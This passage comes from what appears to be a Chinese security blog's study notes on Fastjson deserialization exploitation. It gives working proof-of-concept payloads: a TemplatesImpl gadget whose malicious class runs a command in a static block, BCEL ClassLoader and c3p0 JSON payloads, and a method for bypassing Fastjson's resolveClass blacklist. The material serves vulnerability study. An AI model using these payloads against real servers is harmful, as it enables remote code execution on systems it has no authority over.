            runtime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl"><a href="#com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl" class="headerlink" title="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"></a>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</h3><p>也不需要本地依赖，攻击方式是直接加载我们写好的bytecode但是由于这个类的<code>_bytecodes、_tfactory、_name、_outputProperties、_class</code>这堆私有属性均没有setter函数，所以要额外开一个<code>Feature.SupportNonPublicField</code>，非常鸡肋</p>
<p>还要预先准备好一个垃圾类，也是在静态段里面写恶意代码，但需要继承AbstractTranslet这个接口，编译好之后用base64编码放在bytecode属性处，用getOutputProperties函数触发（说起来之前实验是只有不指定类的parseObject在toJSON那会调用所有getter，但是这里似乎啥情况都能调用，是因为多套了一层吗？<br>getOutputProperties来触发</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>DOM<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>TransletException<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span>DTMAxisIterator<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span>SerializationHandler<span class="token punctuation">;</span>

<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>

    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> SerializationHandler<span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> DTMAxisIterator iterator<span class="token punctuation">,</span> SerializationHandler handler<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>抄的payload</p>
<pre class=" language-java"><code class="language-java">        <span class="token keyword">final</span> String NASTY_CLASS <span class="token operator">=</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">;</span>
        String payload <span class="token operator">=</span> <span class="token string">"{'rand1':{"</span> <span class="token operator">+</span>
                <span class="token string">"\"@type\":\""</span> <span class="token operator">+</span> NASTY_CLASS <span class="token operator">+</span> <span class="token string">"\","</span> <span class="token operator">+</span>
                <span class="token string">"\"_bytecodes\":[\""</span> <span class="token operator">+</span> evilCode_base64 <span class="token operator">+</span> <span class="token string">"\"],"</span> <span class="token operator">+</span>
                <span class="token string">"'_name':'aaa',"</span> <span class="token operator">+</span>
                <span class="token string">"'_tfactory':{},"</span> <span class="token operator">+</span>
                <span class="token string">"'_outputProperties':{}"</span> <span class="token operator">+</span>
                <span class="token string">"}}\n"</span><span class="token punctuation">;</span>
</code></pre>
<h3 id="org-apache-tomcat-dbcp-dbcp-BasicDataSource"><a href="#org-apache-tomcat-dbcp-dbcp-BasicDataSource" class="headerlink" title="org.apache.tomcat.dbcp.dbcp.BasicDataSource"></a>org.apache.tomcat.dbcp.dbcp.BasicDataSource</h3><p>Tomcat 8.0后该类路径为org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p>
<p>更新第三个payload，今天新学的BCEL Classloader，这个类和templateImpl有点像，均可以直接从字符串中还原字节码进行加载，但其相比于templateImpl而言所有需要可控的属性均为public的，因此利用条件会简单一些</p>
<p>然而，用于触发的这个类不知道会不会自带，不过应该提供了web服务就会带上tomcat的依赖吧（猜的）</p>
<p>p神也提到过BCEL Classloader，不过似乎在Jdk 8u251中已经移除了该Classloader<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader去哪了</a></p>
<p>但是我试了一下本地的jdk，在openjdk的8u292下，BCEL Classloader仍然存在，不过对于Oracle的jdk而言，确实没了</p>
<p>调用链为</p>
<pre class=" language-java"><code class="language-java">BasicDataSource<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    BasicDataSource<span class="token punctuation">.</span><span class="token function">createDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        BasicDataSource<span class="token punctuation">.</span><span class="token function">createConnectionFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>而在createConnectionFactory函数中，调用了<code>Class.forName(driverClassName, true, driverClassLoader)</code>，这里就用上了我们一开始提到的这个BCEL Classloader，这个classloader重写了loadClass方法，会检查一下类名是不是以<code>$$BCEL$$</code>开头，如果是的话，就直接从类名中还原类的字节码。因此，还是照例写一个恶意类，在static段执行命令，然后把编译出来的.class文件使用<code>com.sun.org.apache.bcel.internal.classfile.Utility</code>的encode方法编码，作为payload，在BCEL Classloader加载时即可触发</p>
<p>这里贴一个poc</p>
<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token punctuation">{</span>
        <span class="token property">"x"</span><span class="token operator">:</span><span class="token punctuation">{</span>
                <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span><span class="token punctuation">,</span>
                <span class="token property">"driverClassLoader"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token property">"driverClassName"</span><span class="token operator">:</span> <span class="token string">"$$BCEL$$$l$8b$I$A$..."</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token operator">:</span> <span class="token string">"x"</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="com-mchange-v2-c3p0-WrapperConnectionPoolDataSource"><a href="#com-mchange-v2-c3p0-WrapperConnectionPoolDataSource" class="headerlink" title="com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"></a>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</h3><p>除BCEL classloader外又一强力利用，可以触发二次反序列化走原生反序列化，且不出网利用。更厉害的是本身配合fastjson原生反序列化走templatesImpl，不需要额外依赖。</p>
<p>具体流程就不分析了，见文末参考链接，简单的结论就是和bcel classloader类似，可以将一个字符串属性反序列化，payload如下</p>
<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"a"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
        <span class="token property">"val"</span><span class="token operator">:</span> <span class="token string">"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"b"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"</span><span class="token punctuation">,</span>
        <span class="token property">"userOverridesAsString"</span><span class="token operator">:</span> <span class="token string">"HexAsciiSerializedMap:&lt;hex string>;"</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>而fastjson本身也存在原生反序列化gadget，JSONArray的toString方法可以触发getter，然后走到经典templatesImpl。toString的触发可以使用BadAttributeValueException去做。</p>
<p>不过好景不长，fastjson的原生反序列化在1.2.49版本后添加了resolveClass，对需要反序列化的内容进行了一个checkAutoType。不过c3p0的利用本来就只能在47用咯，所以如果是c3p0到原生反序列化不出网RCE倒是没有影响。</p>
<h4 id="fastjson原生反序列化resolveClass绕过"><a href="#fastjson原生反序列化resolveClass绕过" class="headerlink" title="fastjson原生反序列化resolveClass绕过"></a>fastjson原生反序列化resolveClass绕过</h4><p>一个很有想法的想法。</p>
<p>前置知识是，反序列化在readObject时，会对对象类型进行判断，如果是reference类型，就不会去resolveClass。而Reference类型对象的创建方法，就是在序列化时将同一个对象写入流两次，第二次的对象就会变为一个reference对象。</p>
<p>进行反序列化时，每个对象会调用各自的readObject方法，所以fastjson就实现了自己的readObject方法，并在里面实现了一个<code>SecureObjectInputStream</code>，并实现了resolveClass，对传入的类名进行一个checkAutoType。</p>
<p>然而，在具体的反序列化流程中，一开始的入口点肯定不会是fastjson的<code>SecureObjectInputStream</code>，这就使得我们可以在外层的对象中先写入无法通过checkAutoType的对象，到fastjson去读取对象时，读取到的是reference对象，不会触发其自定义的resolveClass，实现了对黑名单的绕过。</p>
<p>样例payload如下</p>
<pre class=" language-java"><code class="language-java">        ArrayList<span class="token operator">&lt;</span>Object<span class="token operator">></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Templates templates <span class="token operator">=</span> Utils<span class="token punctuation">.</span><span class="token function">getTemplate</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>
        JSONArray jsonArray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        jsonArray<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>
        BadAttributeValueExpException exception <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field val <span class="token operator">=</span> exception<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        val<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        val<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>exception<span class="token punctuation">,</span> jsonArray<span class="token punctuation">)</span><span class="token punctuation">;</span>
        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>exception<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> list<span class="token punctuation">;</span>
</code></pre>
<h4 id="使用fastjson绕过原生反序列化黑名单"><a href="#使用fastjson绕过原生反序列化黑名单" class="headerlink" title="使用fastjson绕过原生反序列化黑名单"></a>使用fastjson绕过原生反序列化黑名单</h4><p>反过来，在原生反序列化存在黑名单的情况，也可以通过fastjson这种自定义了resolveClass的方法去绕过。<strong>readObject时，优先触发内层ObjectInputStream的resolveClass方法</strong>，像fastjson这样的黑名单和常规反序列化黑名单对不上的，直接走fastjson的ObjectInputStream即可绕过。（不过听说后来fastjson也加了一些奇怪的黑名单，比如signedObject这种fastjson反序列化根本不可能利用的类）</p>
<p>简单来说，对于存在fastjson原生反序列化的场景，就是原生反序列化黑名单和fastjson原生反序列化黑名单可以两个选一个用。如果是需要经过里层的fastjson作为gadget，就可以用外层原生去做reference，如果本身有其他的gadget但是有黑名单，就可以直接走fastjson内部的不怎么影响原生反序列化的readObject黑名单。</p>
<h2 id="一些相关思考"><a href="#一些相关思考" class="headerlink" title="一些相关思考"></a>一些相关思考</h2><h3 id="payload的构造"><a href="#payload的构造" class="headerlink" title="payload的构造"></a>payload的构造</h3><p>考虑如何在反序列化时在已经指定了反序列化类的情况下反序列化我们自己的payload类<br>fastJson似乎在这里的检验并不是很严格，只需要最后的这个对象和指定的类一致就行了，也就是说，我们只要别太直接，不在最外层直接反序列化我们的payload，就能成功<br>比如，给指定的类加一个额外的属性，将这个属性的值赋为我们的payload，或是直接将指定类的一个属性赋值为一个JSONObject，然后再在JSONObject中反序列化我们的payload</p>
<h3 id="getter方法的触发"><a href="#getter方法的触发" class="headerlink" title="getter方法的触发"></a>getter方法的触发</h3><h4 id="1"><a href="#1" class="headerlink" title="#1"></a>#1</h4><p>在调用的是parseObject且未指定类时，反序列化出来的是JSONObject，会在toJSON方法中直接调用所有的getter</p>
<h4 id="2"><a href="#2" class="headerlink" title="#2"></a>#2</h4><p>为什么_outputProperties和getOutputProperties差了一个下划线，以及本身是一个get方法也能被主动调用？<br>参考一下这篇文章<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://mp.weixin.qq.com/s/C1Eo9wst9vAvF1jvoteFoA">FastJson反序列化漏洞利用的三个细节 - TemplatesImpl利用链</a></p>
<p>判断的关键位置是JavaBeanInfo类的build函数<br>简单的看了一下，先看了下方法名是不是get开头的之类的简单判断，主要的判断条件是getter的返回值，如果满足如下条件就会把getter加入到FieldList里面，之后被调用</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>Collection<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token operator">||</span> Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token operator">||</span> AtomicBoolean<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">==</span> method<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token operator">||</span> AtomicInteger<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">==</span> method<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token operator">||</span> AtomicLong<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">==</span> method<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span> 
</code></pre>
<p>而getOutputProperties的返回类型为Properties，继承自Hashtable，而Hashtable又implement了Map，所以刚好能被自动调用</p>
<h4 id="3"><a href="#3" class="headerlink" title="#3"></a>#3</h4><p>在不符合1、2的情况下如何主动去触发？<br>使用<code>$ref</code>对变量进行引用<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/solitudi/article/details/120275526">[Java安全]Fastjson＞&#x3D;1.2.36$ref引用可触发get方法分析</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://paper.seebug.org/1613/">利用 fastjson $ref 构造 poc</a><br>具体过程并未细究，只是你引用一个对象，想当然的应该要获取那个对象的值，自然就会调用到getter方法，至于为什么在1.2.36之后才能用，上述文章有提及，暂时没有细究老版本fastjson实现时在考虑什么</p>
<h4 id="4"><a href="#4" class="headerlink" title="#4"></a>#4</h4><p>以及刚才的BasicDataSource的payload，这里有一个比较tricky的操作，即在整个payload外面多套了一层大括号，且将payload作为键而不是值。这是因为praseObject时才会对所有的getter进行调用，而仅仅是parse之后调用部分符合条件的getter，但这里的触发点，getConnection并不符合条件，于是通过多套一层大括号，将这个对象变为一个JSONObject，再令payload为JSON的key</p>
<blockquote>
<p>JSONObject是Map的子类，在执行toString()时会将当前类转为字符串形式，会提取类中所有的Field，自然会执行相应的getter、is等方法。<br>在JSON反序列化的时候，FastJson会对JSON Key自动调用toString()方法</p>
</blockquote>
<p>也就是说，这个payload完整情况下是这个样子的，不过fastJson会自己识别这个类就是一个JSONObject啦</p>
<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token punctuation">{</span>
        <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.alibaba.fastjson.JSONObject"</span><span class="token punctuation">,</span>
        <span class="token property">"x"</span><span class="token operator">:</span><span class="token punctuation">{</span>
                <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span><span class="token punctuation">,</span>
                <span class="token property">"driverClassLoader"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token property">"driverClassName"</span><span class="token operator">:</span> <span class="token string">"$$BCEL$$$l$8b$I$A$..."</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token operator">:</span> <span class="token string">"x"</span>
<span class="token punctuation">}</span>
</code></pre>
<p><a target="_blank" rel="external nofollow noopener noreferrer" href="http://www.yulegeyu.com/2021/09/22/%E9%82%A3%E4%BA%9B%E5%B9%B4%E4%B8%80%E8%B5%B7%E6%89%93%E8%BF%87%E7%9A%84CTF-Laravel-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86Tricks%E5%88%86%E6%9E%90/">这篇博客</a>中提到在<code>fastjson&gt;1.2.36</code>后JSONObject不再对key进行toString操作，但是刚好又出现了<code>$ref</code>这个方法进行引用<br>除此之外，该文章提到虽然修改了不直接对key toString，但若key后面跟的不是0-9，字符串或<code>-</code>，又会对key使用toString，也就是说，把上述payload中的<code>&quot;x&quot;</code>改为一个空对象也可以进行触发</p>
<h3 id="漏洞的触发点"><a href="#漏洞的触发点" class="headerlink" title="漏洞的触发点"></a>漏洞的触发点</h3><p>很智障的想起来如果本地有依赖能不能拿CC之类的链来打，想到一半突然想起来这里的漏洞触发点并不是readObject，而是构造函数以及setter，getter。。。太愚蠢了</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://paper.seebug.org/1192/">Fastjson 反序列化漏洞史</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">FastJson 反序列化学习</a><br>这个师傅还跟了一遍fastjson的json解析流程<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/7027">JAVA反序列化—FastJson组件</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://mp.weixin.qq.com/s/C1Eo9wst9vAvF1jvoteFoA">FastJson反序列化漏洞利用的三个细节 - TemplatesImpl利用链</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">Java动态类加载，当FastJson遇到内网</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://tttang.com/archive/1411/">JAVA反序列化之C3P0</a><br>原生反序列化的利用绕过<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">FastJson与原生反序列化-二</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Java/" rel="tag"># Java</a>
              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/%E7%A5%A5%E4%BA%91%E6%9D%AF2021%20wp.html" rel="prev" title="祥云杯2021 web wp">
      <i class="fa fa-chevron-left"></i> 祥云杯2021 web wp
    </a></div>
      <div class="post-nav-item">
    <a href="/%5BRCTF2021%5D%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95.html" rel="next" title="[RCTF2021]挨打记录">
      [RCTF2021]挨打记录 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E6%98%93%E5%85%A5%E9%97%A8"><span class="nav-number">1.</span> <span class="nav-text">Fastjson反序列化简易入门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E6%98%93%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.1.</span> <span class="nav-text">简易环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81"><span class="nav-number">1.2.</span> <span class="nav-text">各版本漏洞及补丁</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-25%E5%85%B3%E9%97%ADautotype"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.2.25关闭autotype</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87%E5%92%8C%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.2.2.</span> <span class="nav-text">黑名单绕过和修复</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lt-x3D-1-2-47%E8%B6%85%E7%BA%A7%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.3.</span> <span class="nav-text">&lt;&#x3D;1.2.47超级漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lt-x3D-1-2-68%E8%B6%85%E7%BA%A7%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.4.</span> <span class="nav-text">&lt;&#x3D;1.2.68超级漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#expectClass%E7%9A%84%E6%84%8F%E4%B9%89"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">expectClass的意义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E4%BA%8EexpectClass%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">关于expectClass的一点思考</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#java-net-Inet6Address"><span class="nav-number">1.3.1.</span> <span class="nav-text">java.net.Inet6Address</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#com-sun-rowset-JdbcRowSetImpl"><span class="nav-number">1.3.2.</span> <span class="nav-text">com.sun.rowset.JdbcRowSetImpl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl"><span class="nav-number">1.3.3.</span> <span class="nav-text">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#org-apache-tomcat-dbcp-dbcp-BasicDataSource"><span class="nav-number">1.3.4.</span> <span class="nav-text">org.apache.tomcat.dbcp.dbcp.BasicDataSource</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#com-mchange-v2-c3p0-WrapperConnectionPoolDataSource"><span class="nav-number">1.3.5.</span> <span class="nav-text">com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96resolveClass%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.5.1.</span> <span class="nav-text">fastjson原生反序列化resolveClass绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8fastjson%E7%BB%95%E8%BF%87%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-number">1.3.5.2.</span> <span class="nav-text">使用fastjson绕过原生反序列化黑名单</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E7%9B%B8%E5%85%B3%E6%80%9D%E8%80%83"><span class="nav-number">1.4.</span> <span class="nav-text">一些相关思考</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload%E7%9A%84%E6%9E%84%E9%80%A0"><span class="nav-number">1.4.1.</span> <span class="nav-text">payload的构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getter%E6%96%B9%E6%B3%95%E7%9A%84%E8%A7%A6%E5%8F%91"><span class="nav-number">1.4.2.</span> <span class="nav-text">getter方法的触发</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" 